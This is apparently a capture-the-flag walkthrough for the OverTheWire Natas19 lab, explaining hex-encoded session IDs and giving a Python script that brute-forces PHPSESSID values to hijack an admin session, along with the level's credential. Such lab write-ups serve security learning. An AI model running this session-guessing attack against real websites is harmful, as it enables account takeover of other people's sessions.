![image](https://github.com/user-attachments/assets/60279342-532f-411a-b7fa-6cdfe3e12538)

It means that unlike Natas18 (where PHPSESSID was predictable using rand(1,640)), Natas19 uses custom or encoded session IDs, but likely still vulnerable.


```
import requests

username = 'natas19'
password = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'  # Replace this with actual password from level 18
url = 'http://natas19.natas.labs.overthewire.org/'

for i in range(1, 641):
    sid = f"{i}-admin".encode("utf-8").hex()  # hex encoding of 'i-admin'
    cookies = {'PHPSESSID': sid}
    r = requests.get(url, auth=(username, password), cookies=cookies)
    print(cookies)
    if "You are an admin" in r.text:
        print(f"[+] Found admin session ID: {sid}")
        print(r.text)
        break

```
This code will get us the password, by bruteforcing.
